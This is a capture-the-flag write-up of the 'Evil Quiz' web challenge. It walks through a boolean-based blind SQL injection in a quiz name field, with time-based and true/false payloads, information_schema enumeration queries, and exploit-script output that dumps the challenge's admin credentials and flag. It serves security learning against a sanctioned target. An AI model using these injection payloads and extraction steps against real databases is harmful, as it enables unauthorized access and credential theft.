# Evil Quiz

**Challenge URL:** https://hackyholidays.h1ctf.com/evil-quiz

## Methodology

Upon launching the application, we are greeted with a `name` field which will be used when we take this evil quiz.

<p align="center">
  <img src="screenshots/evil-quiz-1.png" style="width:90%; border:0.5px solid black">
  <img src="screenshots/evil-quiz-2.png" style="width:90%; border:0.5px solid black">
</p>

> As usual, the admin login page was not vulnerable to SQL injection.

At the end of the quiz, we are shown our evil score, as well as our input `name`:

<p align="center">
  <img src="screenshots/evil-quiz-3.png" style="width:90%; border:0.5px solid black">
</p>

Maybe the `name` field is somehow vulnerable..? Let me try a simple `sleep()` sub-query and see if it works:

```
' OR (SELECT SLEEP(10)); -- -
```

<p align="center">
  <img src="screenshots/evil-quiz-4.png" style="width:90%; border:0.5px solid black">
  <img src="screenshots/evil-quiz-5.png" style="width:90%; border:0.5px solid black">
</p>

Looks promising, but whatever time that I used in `sleep()`, it gave me `504 Gateway Time-out`. Maybe there's another way to perform SQL injection?

New payloads:
```py
# True payload
' AND (SELECT 1); -- -
```
<p align="center">
  <img src="screenshots/evil-quiz-6.png" style="width:90%; border:0.5px solid black">
</p>

```py
# False payload
' AND (SELECT 0); -- -
```
<p align="center">
  <img src="screenshots/evil-quiz-7.png" style="width:90%; border:0.5px solid black">
</p>

Notice anything different? Upon a `TRUE` statement, the output shows that there are `> 0 player(s)` but upon a `FALSE` statement, the output shows that there are `0 other player(s)`.

This confirms the existence of a **boolean-based blind SQL injection** vulnerability.

### Blind SQL Injection Vulnerability

In a typical blind SQL injection payload, we can only exfiltrate data from the server character by character. One common way to do this is to make use of the `substr()` function coupled with the `ascii()` function, both of which are SQL functions.

The idea is, if the current character that we are exfiltrating matches our "guess" character, then we will follow the `TRUE` statement. Otherwise, we will follow the `FALSE` statement. Since this is MySQL flavored database, we have to use `IF()` to do the [conditional checking](https://dev.mysql.com/doc/refman/8.0/en/flow-control-functions.html#function_if):

```sql
-- Assume that we want to exfiltrate the output of "SELECT VERSION();"
SELECT VERSION();

-- Obtaining 1 character, starting from the first character of the version string:
SUBSTR((SELECT VERSION()), 1, 1)

-- Converting this character to ASCII value:
ASCII(SUBSTR((SELECT VERSION()), 1, 1))

-- Comparing the ASCII value against "56", which is decimal value 8:
ASCII(SUBSTR((SELECT VERSION()), 1, 1))=56

-- Putting it together, SELECT 1 if the first character of the version string is "8" in decimal. Otherwise, SELECT 0 if it is not:
SELECT IF(ASCII(SUBSTR((SELECT VERSION()), 1, 1))=56, 1, 0)
```

#### Constraints
Even though the vulnerability was easily identified, some not so obvious constraints that were imposed by this challenge are:
1. One `name` is set per session cookie, this means we have to start a new session on each attempt.
2. The final quiz score page can only be retrieved once the quiz has been "completed".

Thus, the sequence of requests must follow:
1. `GET /evil-quiz`
2. `POST /evil-quiz`, setting the `name` parameter as the injection payload
3. `GET /evil-quiz/start`
4. `POST /evil-quiz/start`, setting the 3 parameters `ques_1`, `ques_2` and `ques_3` as `0` (there are other valid values)
5. `GET /evil-quiz/score`, which contains output controlled by the injection payload

#### Practical Methodology
Since there is no knowledge of the database schema and its tables, querying the database must follow a certain format, since we should not make any unnecessary assumptions:
1. Obtain the `schema` name, which can be done by making use of the `information_schema.tables` [table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html):
    ```sql
    -- Assumes that there is only 1 user-created schema
    SELECT table_schema FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 1;
    ```

2. Obtain the `table` name in the `schema` obtained in previous step, making use of the `information_schema.tables` [table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) again:
    ```sql
    -- Assumes that there is only 1 user-created table, more can be discovered by appending OFFSET X where X is an integer
    SELECT table_name FROM information_schema.tables WHERE table_schema = 'SCHEMA_NAME' LIMIT 1;
    ```

3. Obtain the `columns` in the `schema.table`, first by obtaining the `COUNT()` and then enumerating one by one, making use of the `information_schema.columns` [table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html):
    ```sql
    -- Obtaining number of columns -> X
    SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'SCHEMA_NAME' AND table_name = 'TABLE_NAME';

    -- Obtaining column names, iterating over X
    SELECT column_name FROM information_schema.columns WHERE table_schema = 'SCHEMA_NAME' AND table_name = 'TABLE_NAME' LIMIT 1 OFFSET X;
    ```

4. Obtain the rows in the `schema.table`, column-by-column using `columns`, this time by directly querying the `schema.table`:
    ```sql
    -- Obtaining row 1, iterating over X columns. More rows can be discovered by appending OFFSET X where X is an integer
    SELECT COLUMN FROM SCHEMA_NAME.TABLE_NAME LIMIT 1;
    ```

#### Blind SQLi Script

My exploit script can be found [here](evil-quiz-exploit.py).

This was the output obtained upon using the script that I created:
```bash
[+] Schema Name Length: 4
quiz
[+] Schema Name: quiz


[+] Table Name Length: 5
admin
[+] Table Name: admin


[+] Number of Columns: 3

[+] Column #1
[+] Column Name Length: 2
id
[+] Column Name: id

[+] Column #2
[+] Column Name Length: 8
username
[+] Column Name: username

[+] Column #3
[+] Column Name Length: 8
password
[+] Column Name: password

[+] Enumerating Row from 'quiz.admin'...

[+] 'id' Length: 1
1
[+] id: 1

[+] 'username' Length: 5
admin
[+] username: admin

[+] 'password' Length: 17
S3creT_p4ssw0rd-$
[+] password: S3creT_p4ssw0rd-$
```

With the credentials `admin:S3creT_p4ssw0rd-$` obtained, it was time to login to the admin page:

<p align="center">
  <img src="screenshots/evil-quiz-8.png" style="width:90%; border:0.5px solid black">
</p>

**Flag:** `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`


## Thoughts 💉
This challenge was my favourite thus far, as it reminded me to enumerate the database properly (i.e. schema and tables). Also, the solution path was straightforward 😄. Usually in blind SQLi, I only had to find out the table name and the column names. It was my first time needing to find out the schema as well, although it was trivial to realize and obtain.

I wanted to challenge myself and revise my blind SQL scripting skills, so I chose not to use `sqlmap`, which others may have reported to have success with.
